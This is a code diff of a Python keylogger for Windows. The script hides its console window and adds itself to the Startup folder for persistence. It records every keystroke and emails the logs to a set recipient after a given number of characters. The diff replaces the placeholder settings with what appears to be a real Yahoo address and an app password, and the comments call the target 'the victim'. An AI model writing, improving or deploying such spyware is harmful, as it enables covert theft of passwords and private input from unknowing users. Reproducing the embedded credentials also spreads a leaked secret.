@@ -7,14 +7,22 @@ import sys
 import os
 import os.path
 import shutil
-from pynput.keyboard import Key, Listener
+try:
+    from pynput.keyboard import Key, Listener
+    pynput_installed = True
+except ModuleNotFoundError:
+    pynput_installed = False
+try:
+    import win32console, win32gui
+    win32_installed = True
+except ModuleNotFoundError:
+    win32_installed = False
 from datetime import datetime
 from os.path import basename, exists
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
-from win10toast import ToastNotifier
-from winreg import *
+
 
 LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
 logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO,
@@ -24,10 +32,10 @@ logger = logging.getLogger()
 EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
 EMAIL_INTERVAL = 100                            # Specify the amount of characters the victim needs to input before email is sent
 PORT = 465                                      # Specify port number (465 recommended)
-SMTP_SERVER = "smtp.example.com"                # Specify SMTP server
-TO_ADDR = "user@domain.com"                     # Specify recipient email address
-FROM_ADDR = "user@domain.com"                   # Specify sender email address
-PASSWORD = "your_password"                      # Enter sender email account password
+SMTP_SERVER = "smtp.mail.yahoo.com"             # Specify SMTP server
+TO_ADDR = "mail.piethon@yahoo.com"              # Specify recipient email address
+FROM_ADDR = "mail.piethon@yahoo.com"            # Specify sender email address
+PASSWORD = "frdcefcvbbrwldmc"                   # Enter sender email account password
 HOSTNAME = socket.gethostname()
 USER = os.getlogin()
 FILE_NAME = basename(sys.argv[0].split("\\")[-1])
@@ -63,15 +71,16 @@ def add_startup():
     curr_dir = os.getcwd()
     
     startup = fr"C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.cmd"
-    startup_exists = exists(startup)
-    
-    if not startup_exists:
-        startup_file = open("start.cmd", "w")
-        startup_file.write(f"cd {curr_dir}\n")
-        startup_file.write("timeout /T 30 /NOBREAK\n")
-        startup_file.write(f"python {abs_path}")
-        startup_file.close()
-        shutil.move(curr_dir + "\\start.cmd", startup)
+
+    startup_file = open("start.cmd", "w")
+    if not pynput_installed:
+        startup_file.write("pip install pynput\n")
+    if not win32_installed:
+        startup_file.write("pip install pywin32\n")
+    startup_file.write(f"cd {curr_dir}\n")
+    startup_file.write(f"python {abs_path}")
+    startup_file.close()
+    shutil.move(curr_dir + "\\start.cmd", startup)
         
 # Send email with keylogs.txt attached
 def send_email():
@@ -110,7 +119,6 @@ def send_email():
 
 # Hide terminal
 def hide():
-    import win32console, win32gui
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
     return True
@@ -154,8 +162,6 @@ def on_release(key):
     pass
 
 hide()
-
-logger.info("[KEYLOGGER START]")
 add_startup()
 
 # Log start time and date
@@ -167,6 +173,7 @@ if len(start_minute) == 1:
 log("-----------------------------\n")
 log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
 log("-----------------------------\n")
+
 
 logger.info("Recording keystrokes...")
 with Listener(on_press = on_press, on_release = on_release) as listener:
